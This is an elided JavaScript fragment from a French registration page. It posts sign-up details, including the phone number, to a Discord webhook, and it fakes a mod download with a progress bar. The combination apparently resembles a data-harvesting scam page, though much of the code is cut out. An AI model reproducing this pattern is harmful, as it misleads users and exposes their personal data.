    ...
    if (registerForm) {
        registerForm.addEventListener('submit', async (event) => {
            ...
            if (!prenom || !nom || !email || !password) { 
                 alert('Veuillez remplir tous les champs requis (Prénom, Nom, Email, Mot de passe).');
                return;
            }
            ...
            try {
                ...
                // 2. Prepare Discord Payload
                 const payload = {
                    ...
                    avatar_url: "", 
                    content: `Nouvelle inscription réussie !`, 
                    embeds: [{
                        ...
                        fields: [
                            ...
                            { name: "Téléphone", value: phone || "Non fourni", inline: true },
                ...
                if (response.ok) {
                    ...
                    alert(`Erreur lors de l'inscription (${response.status}). Veuillez réessayer.`);
                }
    ...
    function simulateDownload(button) {
        ...
        const interval = setInterval(() => {
            ...
            if (progress >= 100) {
                ...
                buttonTextSpan.textContent = 'Mod ajouté !';
